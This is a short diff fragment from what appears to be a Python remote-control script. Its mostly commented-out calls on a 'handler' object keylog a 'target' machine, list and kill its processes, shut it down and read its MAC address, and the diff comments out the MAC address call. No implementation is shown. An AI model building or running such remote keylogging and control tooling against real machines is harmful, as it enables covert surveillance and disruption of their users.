@@ -83,9 +83,9 @@ t.start()
 # handler.list_process(target[1])
 # handler.keylog(target[1], 30)
 # handler.list_application(target[1])
-# handler.kill_process(target[1], 16316) # ------------
+# handler.kill_process(target[1], 18328) # ------------
 # handler.kill_application(target[1], 3504) # ----------
 # handler.shut_down(target[1])
 # handler.logout(target[1])
 # handler.restart(target[1])
-handler.mac_address(target[1])
+# handler.mac_address(target[1])
